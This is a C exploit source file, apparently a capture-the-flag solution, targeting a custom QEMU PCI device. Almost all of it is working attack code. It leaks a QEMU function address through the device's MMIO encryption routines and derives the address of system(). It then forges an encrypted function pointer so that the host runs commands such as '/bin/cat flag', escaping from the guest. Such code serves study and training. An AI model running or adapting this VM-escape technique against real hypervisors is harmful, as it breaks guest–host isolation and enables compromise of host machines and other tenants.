/**
 * exp by f1sh 
 * 2019.06
 */

#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/aes.h>

#define DMA_BASE 0x40000

unsigned char* iomem;
unsigned char* dmabuf;
uint64_t dmabuf_phys_addr;

char data_list[32] = {0};
char allzero_list[32] = {0};

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void hexdump(uint8_t* mem, size_t len)
{
    for (size_t i = 1; i <= len; i++)
    {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void iowrite(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
    return *((uint64_t*)(iomem + addr));
}

void dma_setcnt(uint32_t cnt)
{
    iowrite(144, cnt);
}

void dma_setdst(uint32_t dst)
{
    iowrite(136, dst);
}

void dma_setsrc(uint32_t src)
{
    iowrite(128, src);
}

void dma_start(uint32_t cmd)
{
    iowrite(152, cmd | 1);
}

void* dma_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);

    dma_start(2);

    sleep(1);
}

void dma_write(uint64_t addr, void* buf, size_t len)
{
    assert(len < 0x1000);
    memcpy(dmabuf, buf, len);

    dma_setsrc(dmabuf_phys_addr);
    dma_setdst(addr);
    dma_setcnt(len);

    dma_start(0);

    sleep(1);
}

void dma_write_qword(uint64_t addr, uint64_t value)
{
    dma_write(addr, &value, 8);
}

uint64_t dma_read_qword(uint64_t addr)
{
    dma_read(addr, 8);
    return *((uint64_t*)dmabuf);
}

void dma_crypted_read(uint64_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);

    dma_start(4 | 2);

    sleep(1);
}

uint64_t leak_qemu_addr()
{
    uint64_t qdata, tmp;
    qdata = *(iomem);
    // set status 3
    qdata = *(iomem+1);
    // key
    for(uint64_t maddr=0x1000; maddr<0x1800; maddr+=0x1)
    {
        *(iomem+maddr) = 0x77;
    }
    // 3->4
    qdata = *(iomem+3);
    // 4->1
    qdata = *(iomem+2);
    // input_buf
    for(uint64_t maddr=0x1800; maddr<0x2800; maddr+=0x1)
    {
        *(iomem+maddr) = 0x44;
    }
    // 1->2
    qdata = *(iomem+4);
    // set 7 stream enc
    qdata = *(iomem+7);
    // 9 enc 2->5
    qdata = *(iomem+9);
    /**
     * after enc status 6
     * output function is full
     * now leak */ 
    qdata &= 0x0000000000000000;
    for(uint64_t moff=0; moff<6; moff+=0x1)
    {
        uint64_t maddr = 0x3800 + moff;
        tmp = *(iomem+maddr);
        tmp &= 0x00000000000000FF;
        printf("got byte: 0x%x\n", tmp);
        qdata |= (tmp<<(moff<<3));
    }
    if((qdata&0x00000000000000FF) != 0x20)
    {
        printf("leak error\n");
        exit(1);
    }
    return qdata;
}

uint64_t get_enc_data(uint64_t part1, uint64_t part2)
{
    uint64_t qdata, tmp;
    AES_KEY enc_key;
    char ckey[0x20] = "AAAAAAAAAAAAAAAA";
    char encrypted_str[0x10] = {0};
    tmp = part1;
    for(uint64_t i=0; i<0x8; i++)
    {
        encrypted_str[i] = tmp&0xFF;
        tmp >>= 8;
    }
    tmp = part2;
    for(uint64_t i=8; i<0x10; i++)
    {
        encrypted_str[i] = tmp&0xFF;
        tmp >>= 8;
    }
    printf("to enc bytes 16: \n");
    hexdump(encrypted_str, 0x10);
    printf("key: \n");
    hexdump(ckey, 0x20);
    /** 
     * AES_KEY aes
     * AES_set_decrypt_key(userkey, 128, &aes)
     * AES_ecb_encrypt(in, out, &aes, 0LL)
    */
    if(AES_set_decrypt_key(ckey, 128, &enc_key) < 0)
        printf("set key error\n");
    AES_ecb_encrypt(encrypted_str, data_list, &enc_key, 0);
    printf("dec res bytes 32: \n");
    hexdump(data_list, 0x20);

    /**all zero */
    for(uint64_t i=0; i<0x10; i++)
        encrypted_str[i] = 'A';
    if(AES_set_decrypt_key(ckey, 128, &enc_key) < 0)
        printf("set key error\n");
    AES_ecb_encrypt(encrypted_str, allzero_list, &enc_key, 0);
    printf("allo dec res bytes 32: \n");
    hexdump(allzero_list, 0x20);
}

void oo_ptr()
{
    /** exploit
     * init 0
     */
    uint64_t qdata;
    qdata = *(iomem+0);
    // set status 3
    qdata = *(iomem+1);
    // key AAAAAAAAAAAAAAAA
    for(uint64_t maddr=0x1000; maddr<0x1010; maddr+=0x1)
    {
        *(iomem+maddr) = 0x41;
    }
    // 3->4
    qdata = *(iomem+3);
    // 4->1
    qdata = *(iomem+2);
    for(uint64_t maddr=0x2000; maddr<0x2010; maddr+=0x1)
    {
        *(iomem+maddr) = data_list[maddr-0x2000];
    }
    for(uint64_t maddr=0x2010; maddr<0x2800; maddr+=0x10)
    {
        for(uint64_t i=0; i<0x10; i++)
            *(iomem+maddr+i) = allzero_list[i];
    }
    for(uint64_t maddr=0x1800; maddr<0x1810; maddr+=0x1)
    {
        *(iomem+maddr) = data_list[maddr-0x1800];
    }
    for(uint64_t maddr=0x1810; maddr<0x2000; maddr+=0x10)
    {
        for(uint64_t i=0; i<0x10; i++)
            *(iomem+maddr+i) = allzero_list[i];
    }
    // 1->2
    qdata = *(iomem+4);
    qdata = *(iomem+5);
    // encrypt
    char tbuf[0x20] = {0};
    printf("write ptr\n");
    qdata = *(iomem+0x9);
    /** qdata = *(iomem+6); 
    qdata = *(iomem+0xA);*/
}

void getshell()
{
    uint64_t qdata;
    char tbuf[0x20] = {0};
    printf("get shell.......\n");
    qdata = *(iomem+0);
    char binsh_str[0x40] = "/bin/id;/bin/pwd;/bin/cat flag\x00";
    // 0->3
    qdata = *(iomem+1);
    // 3->4
    qdata = *(iomem+3);
    // 4->1
    qdata = *(iomem+2);
    for(uint64_t maddr=0x2000; maddr<0x2040; maddr+=0x1)
    {
        *(iomem+maddr) = binsh_str[maddr-0x2000];
    }
    
    // 1->2
    qdata = *(iomem+4);
    printf(".....");
    gets(tbuf);
    // encrypt
    qdata = *(iomem+0x9);
}

int main(int argc, char *argv[])
{
    // Open and map I/O memory for the hitb device
    // 00:04.0 Class 00ff: 1234:8848
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
        die("open");

    //iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    iomem = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        die("mmap");

    printf("iomem @ %p\n", iomem);

    // Allocate DMA buffer and obtain its physical address
	dmabuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");

    mlock(dmabuf, 0x1000);
	dmabuf_phys_addr = virt2phys(dmabuf);

    printf("DMA buffer (virt) @ %p\n", dmabuf);
	printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);

    // leak
    uint64_t qdata = leak_qemu_addr();
    printf("leaked stream_encrypto_fucntion: 0x%llx\n", qdata);
    // offset 0x4d2a20
    uint64_t qemu_base = qdata-0x4d2a20;
    printf("leaked qemu base: 0x%llx\n", qemu_base);
    uint64_t system_offset = 0x2adf80;
    uint64_t system_addr = qemu_base + system_offset;
    printf("leaked plt system: 0x%llx\n", system_addr);
    uint64_t part1 = 0x4141414141414141;
    uint64_t part2 = 0x4141414141414141 ^ system_addr;
    char tbuf[0x200] = {0};
    get_enc_data(part1, part2);
    oo_ptr();
    getshell();
    return 0;
}
